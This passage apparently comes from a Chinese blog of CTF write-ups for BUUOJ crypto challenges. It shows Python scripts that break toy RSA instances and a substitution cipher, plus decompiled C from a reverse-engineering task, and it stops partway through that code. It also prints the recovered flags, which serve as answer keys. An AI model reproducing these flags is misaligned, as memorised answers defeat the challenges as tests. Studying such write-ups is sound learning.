class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RSA基础-BJDCTF-2nd-rsa0"><a href="#RSA基础-BJDCTF-2nd-rsa0" class="headerlink" title="RSA基础-[BJDCTF 2nd]rsa0"></a>RSA基础-[BJDCTF 2nd]rsa0</h2><p>下面是给出的数据</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">┌──(m4xlmum㉿kali)-[~]└─$ nc node3.buuoj.cn 25542                                                                               e&#x3D;9261487p+q&#x3D;20595382049497133602969407920821468563134851716758639240341261319944154912707581616052449604524075346372380963546505863644441704744659753451822126457089790p-q&#x3D;4245973275379937339800254871751794029621135583348704973009466583288068856613096499337640761469161236555087061518110144521735865913438069893475880154489552c&#x3D;35203479693629584261060479309205133578584402518738719887772606759170491533838367761859632450395468036351668015403145831512053843021243437105985391616736993290885277829036524368069739060914022302728552684082257558900451341072367705779206632503639191730121057845474173642138365331273678118513379679105423351519flag&#x3D;??????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接写个python脚本有手就行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">9261487</span>paddq <span class="token operator">=</span> <span class="token number">20595382049497133602969407920821468563134851716758639240341261319944154912707581616052449604524075346372380963546505863644441704744659753451822126457089790</span>psubq <span class="token operator">=</span> <span class="token number">4245973275379937339800254871751794029621135583348704973009466583288068856613096499337640761469161236555087061518110144521735865913438069893475880154489552</span>c <span class="token operator">=</span> <span class="token number">35203479693629584261060479309205133578584402518738719887772606759170491533838367761859632450395468036351668015403145831512053843021243437105985391616736993290885277829036524368069739060914022302728552684082257558900451341072367705779206632503639191730121057845474173642138365331273678118513379679105423351519</span>p <span class="token operator">=</span> <span class="token punctuation">(</span>paddq <span class="token operator">+</span> psubq<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>q <span class="token operator">=</span> paddq <span class="token operator">-</span> pn <span class="token operator">=</span> p <span class="token operator">*</span> qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'flag&#123;28a64bf0-5990-4f4e-be28-3c69ad6a76b8&#125;\n'</span><span class="token comment"># flag&#123;28a64bf0-5990-4f4e-be28-3c69ad6a76b8&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RSA各种脚本计算方程组-BJDCTF-2nd-rsa1"><a href="#RSA各种脚本计算方程组-BJDCTF-2nd-rsa1" class="headerlink" title="RSA各种脚本计算方程组-[BJDCTF 2nd]rsa1"></a>RSA各种脚本计算方程组-[BJDCTF 2nd]rsa1</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">e<span class="token operator">=</span><span class="token number">10285259</span>p<span class="token operator">^</span><span class="token number">2</span><span class="token operator">+</span>q<span class="token operator">^</span><span class="token number">2</span><span class="token operator">=</span><span class="token number">148193034686093875606936772901796192571303001115029291517405331993393203269281099081710974212574713219081347567428971014001283118773089717464796658514005538220560363869356411053339131801477137920584165364824035655608984148638721704961444994765607118407752424527350332483861193466582296836758326629420997138530</span>p<span class="token operator">-</span>q<span class="token operator">=</span><span class="token number">3402414624993633952217953385870975916545481408651416647913976811822639004934920485060318354591101655404901664274031766949876928066547558116562382034794768</span>c<span class="token operator">=</span><span class="token number">6108352927563244872746082764308283395262145280733588398003302384682546586297303948508036522388063991258529485895131083518717700697235961114589046843808427758029471152474445214855919689222452290920139403258212312495541027718270900389472818404179516997158391906474152124429458221729453255084862167956482137326</span>flag<span class="token operator">=</span>??????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据如上所示，直接解吧，下面用了sympy和z3-solver两种解决了方程组，感觉自己应该也可以算的，但是总是错，（我数学本来就不好，还是直接添加到脚本里让它做吧）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> gmpy2<span class="token punctuation">,</span> sympy<span class="token punctuation">,</span> libnum<span class="token punctuation">,</span> factordb<span class="token punctuation">.</span>factordb<span class="token punctuation">,</span> z3e <span class="token operator">=</span> <span class="token number">10285259</span>c <span class="token operator">=</span> <span class="token number">6108352927563244872746082764308283395262145280733588398003302384682546586297303948508036522388063991258529485895131083518717700697235961114589046843808427758029471152474445214855919689222452290920139403258212312495541027718270900389472818404179516997158391906474152124429458221729453255084862167956482137326</span>p2q2 <span class="token operator">=</span> <span class="token number">148193034686093875606936772901796192571303001115029291517405331993393203269281099081710974212574713219081347567428971014001283118773089717464796658514005538220560363869356411053339131801477137920584165364824035655608984148638721704961444994765607118407752424527350332483861193466582296836758326629420997138530</span>pq <span class="token operator">=</span> <span class="token number">3402414624993633952217953385870975916545481408651416647913976811822639004934920485060318354591101655404901664274031766949876928066547558116562382034794768</span><span class="token triple-quoted-string string">"""下面用sympy算p, q = sympy.symbols('p q')flag = sympy.solve([p*p + q*q - p2q2, p - q - pq], [p, q])print(flag)"""</span><span class="token triple-quoted-string string">"""下面的不行# 那就直接干了，先求n=p*q再在线分解大整数n。n = (p2q2 - pow(pq, 2)) // 2print(n)p = factordb.factordb.FactorDB(n).connect().json()['factors']print(p)"""</span><span class="token triple-quoted-string string">"""# 脚本好是好，就是没有人思维活跃n = (p2q2 - pow(pq, 2)) // 2paddq = gmpy2.iroot(p2q2 + 2*n, 2)paddq = int(paddq[1])p = (paddq + pq) // 2print(p)q = paddq - p"""</span><span class="token triple-quoted-string string">"""# z3脚本做s = z3.Solver()p, q = z3.Ints('p q')s.add(p * p + q * q == p2q2)s.add(p - q == pq)s.add(p > 0)s.add(q > 0)arr = []if s.check() == z3.sat:    arr = s.model()print(arr)"""</span>q <span class="token operator">=</span> <span class="token number">6736944796996960993603438083709293466421599211209692971073886968784871077399620232086062402949866000920159626464399272591808807316300065266948174349941919</span>p <span class="token operator">=</span> <span class="token number">10139359421990594945821391469580269382967080619861109618987863780607510082334540717146380757540967656325061290738431039541685735382847623383510556384736687</span>n <span class="token operator">=</span> <span class="token punctuation">(</span>p2q2 <span class="token operator">-</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>pq<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""14337636555117934521601169772852941750969644747881248278436389781692555060089291958279532414690214903050b'flag&#123;e74940d4-efb7-4015-901a-69fc671ce971&#125;\n'flag&#123;e74940d4-efb7-4015-901a-69fc671ce971&#125;"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="C语言写的密码-分析"><a href="#C语言写的密码-分析" class="headerlink" title="C语言写的密码-分析"></a>C语言写的密码-分析</h1><h2 id="单表替换密码-AFCTF2018-Single"><a href="#单表替换密码-AFCTF2018-Single" class="headerlink" title="单表替换密码-[AFCTF2018]Single"></a>单表替换密码-[AFCTF2018]Single</h2><p>简单分析一下文件，很简单，简单地测试一下给的cpp文件，判断应该是个简单的单表替换密码，下面是c文件的分析</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token comment">/*int main()&#123;freopen("Plain.txt","r",stdin);freopen("Cipher.txt","w",stdout);map&lt;char, char> f;int arr[26];for(int i=0;i&lt;26;++i)&#123;arr[i]=i;&#125;random_shuffle(arr,arr+26);for(int i=0;i&lt;26;++i)&#123;f['a'+i]='a'+arr[i];f['A'+i]='A'+arr[i];&#125;char ch;while((ch=getchar())!=EOF)&#123;if(f.count(ch))&#123;putchar(f[ch]);&#125;else&#123;putchar(ch);&#125;&#125;return 0;&#125;*/</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    map<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">></span> f<span class="token punctuation">;</span><span class="token keyword">int</span> arr<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">26</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">random_shuffle</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> arr<span class="token operator">+</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出一下证明是伪随机：12 1 9 24 0 11 25 21 4 15 18 5 14 13 23 16 6 3 20 17 8 19 22 10 2 7</span><span class="token comment">/*for(int i=0;i&lt;26;++i)&#123;cout &lt;&lt; 'a' + arr[i] &lt;&lt; " ";&#125;*/</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">26</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>f<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">+</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>f<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">+</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">26</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> f<span class="token punctuation">[</span><span class="token string">'a'</span> <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">26</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> f<span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> ch<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ch<span class="token operator">=</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">putchar</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>ch<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">putchar</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/25/BUUOJ-crypto/image-20210507010035419.png" alt="image-20210507010035419"></p><p>猜测应该是a-z替换为上表。写python脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> stringciphertext <span class="token operator">=</span> <span class="token string">'m b j y a l z v e p s f o n x q g d u r i t w k c h'</span>flag <span class="token operator">=</span> <span class="token string">'mljrl&#123;Xv_I_lxiny_er_neja_rDc&#125;'</span>cipher <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>tempkey <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>tempval <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tempkey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cipher<span class="token punctuation">[</span>tempkey<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> tempval<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    cipher<span class="token punctuation">[</span>tempkey<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> tempval<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">+=</span> cipher<span class="token punctuation">[</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        res <span class="token operator">+=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># afctf&#123;Oh_U_found_it_nice_tRy&#125;</span><span class="token comment"># flag&#123;Oh_U_found_it_nice_tRy&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="真正的其他-奇奇怪怪的"><a href="#真正的其他-奇奇怪怪的" class="headerlink" title="真正的其他-奇奇怪怪的"></a>真正的其他-奇奇怪怪的</h1><h2 id="1-sage求方程组、matlab求方程-网鼎杯-2020-青龙组-boom"><a href="#1-sage求方程组、matlab求方程-网鼎杯-2020-青龙组-boom" class="headerlink" title="1.sage求方程组、matlab求方程[网鼎杯 2020 青龙组]boom"></a>1.sage求方程组、matlab求方程[网鼎杯 2020 青龙组]boom</h2><p>level1的md5直接在线就有<code>en5oy</code></p><p>level2正好练习一下sage使用，给的方程式组如下：</p><pre class="line-numbers language-mathematica" data-language="mathematica"><code class="language-mathematica">This time:Here are have some formulas3x-y+z&#x3D;1852x+3y-z&#x3D;321x+y+z&#x3D;173input: x &#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写的sage脚本如下：</p><p><img src="/2020/11/25/BUUOJ-crypto/image-20210507013443600.png" alt="image-20210507013443600"></p><p><img src="/2020/11/25/BUUOJ-crypto/image-20210507013550186.png" alt="image-20210507013550186"></p><p>解出来没用，屏幕一闪而过，拿出了我的ida开始逆向分析。。。主要代码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> Str<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-128h] BYREF</span>  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+56h] [ebp-F6h] BYREF</span>  _DWORD v7<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+88h] [ebp-C4h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+C8h] [ebp-84h] BYREF</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [esp+120h] [ebp-2Ch] BYREF</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+12Ch] [ebp-20h] BYREF</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+130h] [ebp-1Ch] BYREF</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [esp+134h] [ebp-18h] BYREF</span>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// [esp+138h] [ebp-14h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+13Ch] [ebp-10h]</span>  <span class="token function">__main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">70</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">229</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">239</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">230</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">22</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">251</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">106</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">189</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"first:this string md5:46e5efe6165a5afb361217446a2dbd01"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">MD5Init</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v8<span class="token punctuation">,</span> Str<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">MD5Final</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  v13 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> v7<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Game over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Great next level"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time:Here are have some formulas"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3x-y+z=185"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2x+3y-z=321"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"x+y+z=173"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input: x = "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input: y = "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v11<span class="token 